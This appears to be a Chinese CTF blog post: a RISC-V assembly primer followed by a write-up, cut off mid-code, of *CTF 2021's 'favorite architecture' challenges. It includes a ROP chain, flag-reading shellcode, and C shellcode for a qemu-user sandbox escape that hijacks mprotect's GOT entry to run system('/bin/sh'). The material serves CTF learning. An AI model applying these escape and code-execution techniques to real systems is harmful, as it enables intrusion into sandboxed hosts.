-<li><p><code>sp(x2)</code>相当于x86的<code>rsp/esp</code>，储存栈顶地址。callee saved</p>
-</li>
-<li><p><code>gp(x3)</code>和<code>tp(x4)</code>这两个寄存器很特殊，程序运行过程都不会变化，作用嘛，我想想……</p>
-</li>
-<li><p><code>a0(x10)-a7(x17)</code>是储存当前调用函数参数的寄存器。特别地：<code>a0</code>类似<code>rax</code>，储存返回值，<code>a7</code>传syscall的调用号。</p>
-</li>
-<li><p><code>pc</code>即program counter。</p>
-</li>
-<li><p><code>t1-t6</code>，是caller saved的temp寄存器。</p>
-</li>
-<li><p><code>s1-s11</code>，是callee saved的temp寄存器。</p>
-</li>
-</ul>
-<h3 id="RISC-V汇编语句"><a href="#RISC-V汇编语句" class="headerlink" title="RISC-V汇编语句"></a>RISC-V汇编语句</h3><p><del>还在等toolchain的编译，忘开多进程了</del></p>
-<p>在RISC-V中，想控制寄存器</p>
-<p>由于汇编语句很多，并且存在很多伪指令（类似高级程序语言概念中的语法糖？），就只列举出重要的出来讲吧。</p>
-<p><code>%hi(x)</code>和<code>%lo(x)</code>分别表示取<code>x</code>寄存器的高地址和低地址。</p>
-<p><code>lb t0, 8(sp)</code>跟<code>sb t0, 8(sp)</code>是对称的，分别是读取内存储存到寄存器和读取寄存器恢复内存原始状态。</p>
-<p>如何实现函数调用时的跳转？有两条汇编指令非常常用：</p>
-<script type="math/tex; mode=display">{jal \qquad r_d,\quad  imm[20:1]}</script><script type="math/tex; mode=display">{jalr \quad r_d, \quad (imm[11:0])r_s}</script><p>作用是在$r_d$上保存下当前栈帧的<code>ra</code>，然后<code>pc</code>会跳转到与<code>pc</code>或者$r_s$的offset为$imm$的地址处。</p>
-<p>而当函数要跳转回来时，相似地有<code>ret</code>的伪指令，这条指令会被认为是<code>jalr x0, 0(x1)</code>。</p>
-<img data-src="http://qiniu.garen-wang.cn/static/images/First-Presentation-in-Kap0k/prologue_and_epilogue.png">
-<p><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/64211181/whats-the-difference-between-caller-saved-and-callee-saved-in-risc-v">关于caller saved和callee saved的细节讨论</a></p>
-<p>找到<a target="_blank" rel="noopener" href="https://web.eecs.utk.edu/~smarz1/courses/ece356/notes/assembly/">一篇不错的文章</a>，不懂的时候查一查就可以了。</p>
-<h3 id="RISC-V实例"><a href="#RISC-V实例" class="headerlink" title="RISC-V实例"></a>RISC-V实例</h3><p>随便写了个类似helloworld的东西，拿到的<code>helloworld.s</code>，可以分析一下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">.file	&quot;helloworld.c&quot;</span><br><span class="line">	.option nopic</span><br><span class="line">	.text</span><br><span class="line">	.section	.rodata</span><br><span class="line">	.align	3</span><br><span class="line">.LC0:</span><br><span class="line">	.string	&quot;Helloworld, %d&quot;</span><br><span class="line">	.text</span><br><span class="line">	.align	1</span><br><span class="line">	.globl	helloworld</span><br><span class="line">	.type	helloworld, @function</span><br><span class="line">helloworld:</span><br><span class="line">  # prologue</span><br><span class="line">	addi	sp,sp,-32</span><br><span class="line">	sd	ra,24(sp)</span><br><span class="line">	sd	s0,16(sp)</span><br><span class="line"></span><br><span class="line">  # main part</span><br><span class="line">	addi	s0,sp,32</span><br><span class="line">	mv	a5,a0 # source of second parameter</span><br><span class="line">	sw	a5,-20(s0)</span><br><span class="line">	lw	a5,-20(s0)</span><br><span class="line">	mv	a1,a5 # second parameter</span><br><span class="line">	lui	a5,%hi(.LC0)</span><br><span class="line">	addi	a0,a5,%lo(.LC0) # first parameter</span><br><span class="line">	call	printf</span><br><span class="line">	nop</span><br><span class="line"></span><br><span class="line">  # epilogue</span><br><span class="line">	ld	ra,24(sp)</span><br><span class="line">	ld	s0,16(sp)</span><br><span class="line">	addi	sp,sp,32</span><br><span class="line">	jr	ra</span><br><span class="line">	.size	helloworld, .-helloworld</span><br><span class="line">	.section	.rodata</span><br><span class="line">	.align	3</span><br><span class="line">.LC1:</span><br><span class="line">	.string	&quot;%d&quot;</span><br><span class="line">	.text</span><br><span class="line">	.align	1</span><br><span class="line">	.globl	main</span><br><span class="line">	.type	main, @function</span><br><span class="line">main:</span><br><span class="line">  # prologue of main</span><br><span class="line">	addi	sp,sp,-32</span><br><span class="line">	sd	ra,24(sp)</span><br><span class="line">	sd	s0,16(sp)</span><br><span class="line"></span><br><span class="line">  # main part</span><br><span class="line">	addi	s0,sp,32</span><br><span class="line">	addi	a5,s0,-20</span><br><span class="line">	mv	a1,a5 # second parameter: address of x</span><br><span class="line">	lui	a5,%hi(.LC1)</span><br><span class="line">	addi	a0,a5,%lo(.LC1) # first parameter: &quot;helloworld, %d&quot;</span><br><span class="line">	call	__isoc99_scanf</span><br><span class="line">	lw	a5,-20(s0)</span><br><span class="line">	mv	a0,a5 # first parameter: address of x</span><br><span class="line">	call	helloworld</span><br><span class="line">	li	a5,0 # clear a5</span><br><span class="line">	mv	a0,a5 # clear a0</span><br><span class="line"></span><br><span class="line">  # epilogue of main</span><br><span class="line">	ld	ra,24(sp)</span><br><span class="line">	ld	s0,16(sp)</span><br><span class="line">	addi	sp,sp,32</span><br><span class="line">	jr	ra</span><br><span class="line">	.size	main, .-main</span><br><span class="line">	.ident	&quot;GCC: (GNU) 10.2.0&quot;</span><br><span class="line">	.section	.note.GNU-stack,&quot;&quot;,@progbits</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h2 id="RISC-V环境配置"><a href="#RISC-V环境配置" class="headerlink" title="RISC-V环境配置"></a>RISC-V环境配置</h2><p>Ubuntu 18.04中可以配置RISC-V GNU Toolchain，内含RISCV架构下的<code>gcc</code>、<code>gdb</code>、<code>as</code>、<code>ld</code>、<code>readelf</code>等必不可少的工具。</p>
-<p>同时当然也需要安装qemu，方便运行RV64的二进制文件。</p>
-<p>有趣的是：以上的工具都需要编译安装，所需时间稍长。建议make的时候手动把进程拉满。</p>
-<h2 id="例题：starctf-2021-pwn-amp-re-favorite-architecture"><a href="#例题：starctf-2021-pwn-amp-re-favorite-architecture" class="headerlink" title="例题：starctf 2021 pwn&amp;re favorite architecture"></a>例题：starctf 2021 pwn&amp;re favorite architecture</h2><h3 id="favorite-architecture-1"><a href="#favorite-architecture-1" class="headerlink" title="favorite architecture 1"></a>favorite architecture 1</h3><p>有个patch挺重要的，要先看一看：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">diff --git a&#x2F;linux-user&#x2F;syscall.c b&#x2F;linux-user&#x2F;syscall.c</span><br><span class="line">index 27adee9..2d75464 100644</span><br><span class="line">--- a&#x2F;linux-user&#x2F;syscall.c</span><br><span class="line">+++ b&#x2F;linux-user&#x2F;syscall.c</span><br><span class="line">@@ -13101,8 +13101,31 @@ abi_long do_syscall(void *cpu_env, int num, abi_long arg1,</span><br><span class="line">         print_syscall(cpu_env, num, arg1, arg2, arg3, arg4, arg5, arg6);</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">-    ret &#x3D; do_syscall1(cpu_env, num, arg1, arg2, arg3, arg4,</span><br><span class="line">-                      arg5, arg6, arg7, arg8);</span><br><span class="line">+    switch (num) &#123;</span><br><span class="line">+        &#x2F;&#x2F; syscall whitelist</span><br><span class="line">+        case TARGET_NR_brk:</span><br><span class="line">+        case TARGET_NR_uname:</span><br><span class="line">+        case TARGET_NR_readlinkat:</span><br><span class="line">+        case TARGET_NR_faccessat:</span><br><span class="line">+        case TARGET_NR_openat2:</span><br><span class="line">+        case TARGET_NR_openat:</span><br><span class="line">+        case TARGET_NR_read:</span><br><span class="line">+        case TARGET_NR_readv:</span><br><span class="line">+        case TARGET_NR_write:</span><br><span class="line">+        case TARGET_NR_writev:</span><br><span class="line">+        case TARGET_NR_mmap:</span><br><span class="line">+        case TARGET_NR_munmap:</span><br><span class="line">+        case TARGET_NR_exit:</span><br><span class="line">+        case TARGET_NR_exit_group:</span><br><span class="line">+        case TARGET_NR_mprotect:</span><br><span class="line">+            ret &#x3D; do_syscall1(cpu_env, num, arg1, arg2, arg3, arg4,</span><br><span class="line">+                    arg5, arg6, arg7, arg8);</span><br><span class="line">+            break;</span><br><span class="line">+        default:</span><br><span class="line">+            printf(&quot;[!] %d bad system call\n&quot;, num);</span><br><span class="line">+            ret &#x3D; -1;</span><br><span class="line">+            break;</span><br><span class="line">+    &#125;</span><br><span class="line"> </span><br><span class="line">     if (unlikely(qemu_loglevel_mask(LOG_STRACE))) &#123;</span><br><span class="line">         print_syscall_ret(cpu_env, num, ret, arg1, arg2,</span><br></pre></td></tr></table></figure>
-<p>意思就是过滤了RISC-V的syscall指令，只剩下这几个让你用，没有<code>execve</code>。</p>
-<p>checksec一下<code>main</code>文件，保护几乎都关了，ASLR也没有。是静态链接的二进制文件。</p>
-<p>反编译打开，搜一下跟”flag”有关的字符串，定位main函数。</p>
-<img data-src="http://qiniu.garen-wang.cn/static/images/First-Presentation-in-Kap0k/you_are.png">
-<p>结果发现符号表没了，不能正常地得到编译结果，只能看到汇编。</p>
-<p>在博客上找到一种解决方法：</p>
-<blockquote>
-<p>反编译出现 unknown error 时得手动改 gp 为 0x6f178（ctrl-A → ctrl-R → 找到gp寄存器并修改）(感谢@X1do0发现的解决方案)</p>
-</blockquote>
-<p>在哪里找得到？在0x101ec可以看见：</p>
-<img data-src="http://qiniu.garen-wang.cn/static/images/First-Presentation-in-Kap0k/get_gp.png">
-<p>得到的主函数反编译结果：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">undefined8 <span class="title">UndefinedFunction_00010400</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  ulonglong uVar1;</span><br><span class="line">  longlong lVar2;</span><br><span class="line">  undefined auStack488 [<span class="number">192</span>];</span><br><span class="line">  undefined auStack296 [<span class="number">256</span>];</span><br><span class="line">  ulonglong uStack40;</span><br><span class="line">  longlong lStack32;</span><br><span class="line">  <span class="keyword">int</span> iStack20;<span class="comment">// cnt</span></span><br><span class="line">  </span><br><span class="line">  FUN_00017d74(PTR_DAT_0006ea28,<span class="number">0</span>);<span class="comment">// setvbuf</span></span><br><span class="line">  FUN_00017d74(PTR_DAT_0006ea20,<span class="number">0</span>);<span class="comment">// setvbuf</span></span><br><span class="line">  FUN_00017d74(PTR_DAT_0006ea18,<span class="number">0</span>);<span class="comment">// setvbuf</span></span><br><span class="line">  FUN_0001605a(<span class="string">&quot;Input the flag: &quot;</span>);<span class="comment">// output</span></span><br><span class="line">  FUN_00016a5a(auStack296);<span class="comment">// read your input</span></span><br><span class="line">  uVar1 = FUN_000204e4(auStack296);<span class="comment">// get string</span></span><br><span class="line">  <span class="keyword">if</span> (uVar1 == ((longlong)(iRam000000000006e9dc + iRam000000000006e9d8) &amp; <span class="number">0xffffffff</span>U)) &#123;</span><br><span class="line">    lStack32 = FUN_00020386(auStack296 + ((longlong)iRam000000000006e9d8 &amp; <span class="number">0xffffffff</span>));</span><br><span class="line">    FUN_0001118a(auStack488,<span class="string">&quot;tzgkwukglbslrmfjsrwimtwyyrkejqzo&quot;</span>,<span class="string">&quot;oaeqjfhclrqk&quot;</span>,<span class="number">0x80</span>);</span><br><span class="line">    FUN_000111ea(auStack488,auStack296,iRam000000000006e9d8);</span><br><span class="line">    lVar2 = FUN_00020e2a(auStack296,&amp;DAT_0006d000,iRam000000000006e9d8);</span><br><span class="line">    <span class="keyword">if</span> (lVar2 == <span class="number">0</span>) &#123;</span><br><span class="line">      uStack40 = FUN_000204e4(lStack32);</span><br><span class="line">      iStack20 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span>( <span class="literal">true</span> ) &#123;</span><br><span class="line">        <span class="keyword">if</span> (uStack40 &gt;&gt; <span class="number">3</span> &lt;= (ulonglong)(longlong)iStack20) &#123;</span><br><span class="line">          FUN_00016bc8(<span class="string">&quot;You are right :D&quot;</span>);<span class="comment">// output</span></span><br><span class="line">          gp = (undefined *)<span class="number">0x6f178</span>;</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        FUN_000102ae(iStack20 * <span class="number">8</span> + lStack32,&amp;DAT_0006d060);</span><br><span class="line">        lVar2 = FUN_00020e2a(iStack20 * <span class="number">8</span> + lStack32,(longlong)(iStack20 * <span class="number">8</span>) + <span class="number">0x6d030</span>,<span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span> (lVar2 != <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">        iStack20 = iStack20 + <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  FUN_00016bc8(<span class="string">&quot;You are wrong ._.&quot;</span>);<span class="comment">// output</span></span><br><span class="line">  gp = (undefined *)<span class="number">0x6f178</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>其实读入部分就是一个栈溢出，就有很多解法，既可以写shellcode，也可以写ROP。</p>
-<p>RISC-V下的syscall跟x86的还是不一样，具体<a target="_blank" rel="noopener" href="https://github.com/westerndigitalcorporation/RISC-V-Linux/blob/master/riscv-pk/pk/syscall.h">看表</a>。</p>
-<p>如果用ROP打的话，ret2csu在rv64也是很好用的。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">00011772 93 07 84 b8     addi       a5,s0,-0x478</span><br><span class="line">00011776 13 09 09 b9     addi       s2,s2,-0x470</span><br><span class="line">0001177a 33 09 f9 40     sub        s2,s2,a5</span><br><span class="line">0001177e 13 59 39 40     srai       s2,s2,0x3</span><br><span class="line">00011782 63 0e 09 00     beq        s2,zero,LAB_0001179e</span><br><span class="line">00011786 13 04 84 b8     addi       s0,s0,-0x478</span><br><span class="line">0001178a 81 44           c.li       s1,0x0</span><br><span class="line">                     LAB_0001178c                                    XREF[1]:     0001179a(j)  </span><br><span class="line">0001178c 1c 60           c.ld       a5&#x3D;&gt;-&gt;FUN_00010284,0x0(s0&#x3D;&gt;-&gt;FUN_00010250)       &#x3D; 00010284</span><br><span class="line">                                                                                     &#x3D; 00010250</span><br><span class="line">0001178e 56 86           c.mv       a2,s5</span><br><span class="line">00011790 d2 85           c.mv       a1,s4</span><br><span class="line">00011792 4e 85           c.mv       a0,s3</span><br><span class="line">00011794 85 04           c.addi     s1,0x1</span><br><span class="line">00011796 82 97           c.jalr     a5&#x3D;&gt;FUN_00010284                                 undefined FUN_00010250()</span><br><span class="line">                                                                                     undefined FUN_00010284()</span><br><span class="line">00011798 21 04           c.addi     s0,0x8</span><br><span class="line">0001179a e3 19 99 fe     bne        s2,s1,LAB_0001178c</span><br><span class="line">                     LAB_0001179e                                    XREF[1]:     00011782(j)  </span><br><span class="line">0001179e e2 70           c.ldsp     ra,0x38(sp)</span><br><span class="line">000117a0 42 74           c.ldsp     s0,0x30(sp)</span><br><span class="line">000117a2 a2 74           c.ldsp     s1,0x28(sp)</span><br><span class="line">000117a4 02 79           c.ldsp     s2,0x20(sp)</span><br><span class="line">000117a6 e2 69           c.ldsp     s3,0x18(sp)</span><br><span class="line">000117a8 42 6a           c.ldsp     s4,0x10(sp)</span><br><span class="line">000117aa a2 6a           c.ldsp     s5,0x8(sp)</span><br><span class="line">000117ac 21 61           c.addi16sp sp,0x40</span><br><span class="line">000117ae 82 80           ret</span><br></pre></td></tr></table></figure>
-<p>因为代码是一样的，只是在架构层面不同，大体思路跟x86下利用是差不多的，不过还是有些差别。</p>
-<ol>
-<li>第一条ROP：0x1179e。控制s0为gets + 0x478，控制s2为gets + 0x470，控制ra为0x11772。</li>
-<li>执行完ret后跳到第二条ROP：0x11772。通过第一步的构造我们能够满足0x11782的beq条件成立，直接跳转到0x1179e。</li>
-<li>第三条ROP：0x1179e。控制s3为bss地址，s1为0，s2为1，ra为0x1178e。</li>
-<li>执行完ret后调到第四条ROP：0x1178e。a0为bss地址，s1=0+1=1=s2，满足0x11796的跳转条件，执行<code>gets(bss_addr)</code>。</li>
-</ol>
-<p>同时shellcode也同样可行，主要的思路是运用三个RISC-V下的系统调用：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$ riscv64-unknown-linux-gnu-as shellcode.s -o shellcode</span><br><span class="line">$ riscv64-unknown-linux-gnu-objcopy -S -o binary -j .text shellcode shellcode.bin</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line">.globl _start</span><br><span class="line">.option rvc</span><br><span class="line">_start:</span><br><span class="line"></span><br><span class="line">  li a1,0x67616c66 #flag</span><br><span class="line">  sd a1,8(sp)</span><br><span class="line">  addi a1,sp,8</span><br><span class="line">  li a0,-100</span><br><span class="line">  li a2,0</span><br><span class="line">  li a7, 56 # 56: openat</span><br><span class="line">  ecall</span><br><span class="line">	</span><br><span class="line">  c.mv a2,a7</span><br><span class="line">  addi a7,a7,7 # 63: read</span><br><span class="line">  ecall</span><br><span class="line">  li a0, 1</span><br><span class="line">  addi a7,a7,1 # 64: write</span><br><span class="line">  ecall</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>这三个系统调用都在白名单里面，写好shellcode直接注入即可。</p>
-<h3 id="favourite-architecture-2"><a href="#favourite-architecture-2" class="headerlink" title="favourite architecture 2"></a>favourite architecture 2</h3><p>第一次接触这种qemu沙箱逃逸的题目，看了好多师傅的博客，终于差不多看懂了，做一下记录。</p>
-<p>之所以可以从qemu中逃逸出来，是因为qemu-user的内存布局跟主系统的内存布局有很紧密的联系。</p>
-<p>经过测试，从qemu-user的沙箱里面，基本可以向qemu执行的程序之外的一定内存空间做任意地址读、任意地址写。</p>
-<p>同样是利用上一题栈溢出的漏洞为基础继续做，只不过这次不读取<code>flag</code>，读取<code>/proc/self/maps</code>，查看内存情况。</p>
-<p>本来想在gdb里面调试看内存的，结果看不见前面的内存。</p>
-<img data-src="http://qiniu.garen-wang.cn/static/images/First-Presentation-in-Kap0k/vmmap1.png">
-<p>msk师傅告诉我这是虚拟地址，确实是这样。</p>
-<p>可以通过访问<code>/proc/self/maps</code>看到当前内存布局，结果发现看了个寂寞：</p>
-<img data-src="http://qiniu.garen-wang.cn/static/images/First-Presentation-in-Kap0k/cat_maps_failed.png">
-<p>有师傅去看了qemu的源码分析，发现原来是qemu塞了个假的内存分布信息给你。（你被骗了</p>
-<p>师傅们有很多的解法，其中一种是改成<code>/./proc/self/maps</code>，就能得到正确的内存分布情况。</p>
-<img data-src="http://qiniu.garen-wang.cn/static/images/First-Presentation-in-Kap0k/cat_maps_successfully.png">
-<p>剩下的内容就是pwn的常规操作：</p>
-<ol>
-<li>通过实际内存分布信息，找到qemu的基地址和libc的基地址。</li>
-<li>查偏移，查出<code>mprotect@got</code>，<code>system</code>和rodata的偏移，利用前面的两个基地址推出实际地址。</li>
-<li>首先利用<code>mprotect</code>把rodata的一段内容改为可写，并在这段首写入<code>/bin/sh\x00</code>。</li>
-<li>劫持<code>mprotect</code>的got表为<code>system</code>函数。</li>
-<li>最后执行shellcode，调用<code>mprotect@got</code>，参数为rodata段首，执行<code>system(&quot;/bin/sh\x00&quot;)</code>。</li>
-</ol>
-<p>只不过这道题要劫持控制流，比较方便的方法还是使用ret2shellcode。</p>
-<p>可以利用C生成出shellcode，下面是示例：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">int openat(int dirfd, char* pathname, int flags);</span><br><span class="line">int read(int fd, void *buf,int size);</span><br><span class="line">int write(int fd, void *buf, int size);</span><br><span class="line">int mprotect(void* addr, unsigned long len, int prot);</span><br><span class="line">void exit(int no);</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line"></span><br><span class="line">	char filename[32];</span><br><span class="line">	filename[0] &#x3D; &#39;&#x2F;&#39;;</span><br><span class="line">	filename[1] &#x3D; &#39;.&#39;;</span><br><span class="line">	filename[2] &#x3D; &#39;&#x2F;&#39;;</span><br><span class="line">	filename[3] &#x3D; &#39;p&#39;;</span><br><span class="line">	filename[4] &#x3D; &#39;r&#39;;</span><br><span class="line">	filename[5] &#x3D; &#39;o&#39;;</span><br><span class="line">	filename[6] &#x3D; &#39;c&#39;;</span><br><span class="line">	filename[7] &#x3D; &#39;&#x2F;&#39;;</span><br><span class="line">	filename[8] &#x3D; &#39;s&#39;;</span><br><span class="line">	filename[9] &#x3D; &#39;e&#39;;</span><br><span class="line">	filename[10] &#x3D; &#39;l&#39;;</span><br><span class="line">	filename[11] &#x3D; &#39;f&#39;;</span><br><span class="line">	filename[12] &#x3D; &#39;&#x2F;&#39;;</span><br><span class="line">	filename[13] &#x3D; &#39;m&#39;;</span><br><span class="line">	filename[14] &#x3D; &#39;a&#39;;</span><br><span class="line">	filename[15] &#x3D; &#39;p&#39;;</span><br><span class="line">	filename[16] &#x3D; &#39;s&#39;;</span><br><span class="line">	filename[17] &#x3D; &#39;\0&#39;;</span><br><span class="line"></span><br><span class="line">	unsigned char *buf &#x3D; (unsigned char*)0x6d000;</span><br><span class="line">	int fd &#x3D; openat(0, filename, 0);</span><br><span class="line">	read(fd, buf, 0xF80);</span><br><span class="line">	write(1, buf, 0xF80);</span><br><span class="line">	read(fd, buf, 0xF80);</span><br><span class="line">	write(1, buf, 0xF80);</span><br><span class="line">	read(fd, buf, 0xF80);</span><br><span class="line">	write(1, buf, 0xF80);</span><br><span class="line"></span><br><span class="line">	unsigned long rodata;</span><br><span class="line">	unsigned long mprotect_got;</span><br><span class="line">	unsigned long system_addr;</span><br><span class="line"></span><br><span class="line">	read(0, &amp;rodata, 8);</span><br><span class="line">	read(0, &amp;mprotect_got, 8);</span><br><span class="line">	read(0, &amp;system_addr, 8);</span><br><span class="line">	mprotect((void *)rodata, 0x3c000, 7);</span><br><span class="line"></span><br><span class="line">	*(unsigned long *)mprotect_got &#x3D; system_addr;</span><br><span class="line"></span><br><span class="line">	buf[0] &#x3D; &#39;&#x2F;&#39;;</span><br><span class="line">	buf[1] &#x3D; &#39;b&#39;;</span><br><span class="line">	buf[2] &#x3D; &#39;i&#39;;</span><br><span class="line">	buf[3] &#x3D; &#39;n&#39;;</span><br><span class="line">	buf[4] &#x3D; &#39;&#x2F;&#39;;</span><br><span class="line">	buf[5] &#x3D; &#39;s&#39;;</span><br><span class="line">	buf[6] &#x3D; &#39;h&#39;;</span><br><span class="line">	buf[7] &#x3D; &#39;\0&#39;;</span><br><span class="line"></span><br><span class="line">	mprotect(buf, 0x1000, 7);	&#x2F;&#x2F; this will call system(&quot;&#x2F;bin&#x2F;sh&quot;)</span><br><span class="line">	exit(0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">asm(&quot;openat:\n&quot;</span><br><span class="line">		&quot;li a7, 56\n&quot;</span><br><span class="line">		&quot;ecall\n&quot;</span><br><span class="line">		&quot;ret\n&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">asm(&quot;read:\n&quot;</span><br><span class="line">		&quot;li a7, 63\n&quot;</span><br><span class="line">		&quot;ecall\n&quot;</span><br><span class="line">		&quot;ret\n&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">asm(&quot;write:\n&quot;</span><br><span class="line">		&quot;li a7, 64\n&quot;</span><br><span class="line">		